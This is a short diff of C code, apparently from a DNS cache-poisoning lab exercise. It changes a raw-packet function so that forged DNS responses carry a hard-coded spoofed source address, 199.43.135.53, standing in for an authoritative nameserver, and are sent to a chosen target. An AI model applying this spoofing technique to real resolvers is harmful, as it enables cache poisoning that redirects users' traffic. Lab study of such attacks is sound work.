@@ -388,7 +388,7 @@ void responsePacket(char *dns_data, char *dest_addr){
     sin.sin_port = htons(33333);
 
     // IP addresses
-    sin.sin_addr.s_addr = inet_addr("199.43.135.53");
+    sin.sin_addr.s_addr = inet_addr(dest_addr);
 
     // Fabricate the IP header or we can use the
     // standard header structures but assign our own values.
@@ -403,7 +403,7 @@ void responsePacket(char *dns_data, char *dest_addr){
     ip->iph_protocol = 17; // UDP
 
     // Source IP address, can use spoofed address here!!!
-    ip->iph_sourceip = inet_addr(src_addr);
+    ip->iph_sourceip = inet_addr("199.43.135.53");
 
     // The destination IP address
     ip->iph_destip = inet_addr(dest_addr);
